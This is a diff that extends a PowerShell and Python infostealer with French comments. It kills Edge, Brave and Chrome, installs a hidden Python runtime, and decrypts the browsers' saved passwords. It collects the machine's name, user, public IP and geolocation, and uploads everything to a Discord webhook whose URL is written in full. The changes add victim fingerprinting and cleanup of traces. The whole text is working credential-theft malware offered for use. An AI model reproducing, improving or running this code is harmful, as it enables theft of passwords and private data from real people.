@@ -2,16 +2,48 @@ $wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y
 taskkill /F /IM msedge.exe,brave.exe,chrome.exe 2>$null
 Start-Sleep 2
 try{
-Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30
-Expand-Archive "$env:TEMP\py.zip" "$env:TEMP\py" -Force
-(Get-Content "$env:TEMP\py\python311._pth") -replace '#import site','import site'|Out-File "$env:TEMP\py\python311._pth" -Encoding ascii
-Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$env:TEMP\py\gp.py" -UseBasicParsing
-cd "$env:TEMP\py"
-.\python.exe gp.py --no-warn-script-location 2>$null
-.\python.exe -m pip install pycryptodome pypiwin32 --quiet 2>$null
+# Vérifier si Python est déjà installé
+$pyPath="$env:TEMP\py"
+$needInstall=$false
+
+if(!(Test-Path "$pyPath\python.exe")){
+ $needInstall=$true
+}else{
+ # Vérifier si les bibliothèques sont installées
+ cd $pyPath
+ $testLibs=.\python.exe -c "import pycryptodome,win32crypt,requests;print('OK')" 2>$null
+ if($testLibs -ne "OK"){$needInstall=$true}
+}
+
+if($needInstall){
+ # Installation complète
+ Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30
+ Expand-Archive "$env:TEMP\py.zip" $pyPath -Force
+ (Get-Content "$pyPath\python311._pth") -replace '#import site','import site'|Out-File "$pyPath\python311._pth" -Encoding ascii
+ Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$pyPath\gp.py" -UseBasicParsing
+ cd $pyPath
+ .\python.exe gp.py --no-warn-script-location 2>$null
+ .\python.exe -m pip install pycryptodome pypiwin32 requests --quiet 2>$null
+ Remove-Item "$env:TEMP\py.zip" -Force -EA 0
+}
+
+cd $pyPath
+
 @'
-import os,json,base64,sqlite3,shutil,win32crypt
+import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime
 from Crypto.Cipher import AES
+try:
+ import requests
+ ip=requests.get("https://api.ipify.org",timeout=3).text
+ geo=requests.get(f"http://ip-api.com/json/{ip}",timeout=3).json()
+ location=f"{geo['city']}, {geo['regionName']}, {geo['country']}"
+ isp=geo.get('isp','N/A')
+except:
+ ip="N/A"
+ location="N/A"
+ isp="N/A"
+import locale
+language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"
 def d(db,st,n):
  try:
   k=win32crypt.CryptUnprotectData(base64.b64decode(json.load(open(st))["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
@@ -28,12 +60,36 @@ b=os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
 if os.path.exists(b+r"\Default\Login Data"):res+=d(b+r"\Default\Login Data",b+r"\Local State","BRAVE")
 g=os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
 if os.path.exists(g+r"\Default\Login Data"):res+=d(g+r"\Default\Login Data",g+r"\Local State","CHROME")
+info=f"""{'='*60}
+SYSTEM INFORMATION
+{'='*60}
+Date/Time: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+Computer Name: {platform.node()}
+Username: {getpass.getuser()}
+OS: {platform.system()} {platform.release()}
+Version: {platform.version()}
+Machine: {platform.machine()}
+Processor: {platform.processor()}
+Hostname: {socket.gethostname()}
+Language: {language}
+Public IP: {ip}
+Location: {location}
+ISP: {isp}
+{'='*60}
+
+TOTAL PASSWORDS: {len(res)}
+{'='*60}
+
+"""
 if res:
- with open("p.txt","w",encoding="utf-8")as f:f.write(f"TOTAL: {len(res)}\n{'='*60}\n\n"+"".join(res))
+ with open("p.txt","w",encoding="utf-8")as f:f.write(info+"".join(res))
  print("OK")
-else:print("NO")
+else:
+ with open("p.txt","w",encoding="utf-8")as f:f.write(info+"No passwords found.\n")
+ print("OK")
 '@|Out-File "e.py" -Encoding UTF8
 $r=.\python.exe e.py 2>$null
-if($r -eq "OK"){curl.exe -F "file=@p.txt" $wh 2>$null;Remove-Item p.txt -Force}
-cd $env:TEMP;Remove-Item py,py.zip -Recurse -Force
+if($r -eq "OK"){curl.exe -F "file=@p.txt" $wh 2>$null;Remove-Item p.txt,e.py -Force -EA 0}
+cd $env:TEMP
+# Ne pas supprimer Python pour réutilisation future
 }catch{curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"Failed on $env:COMPUTERNAME`"}" $wh}
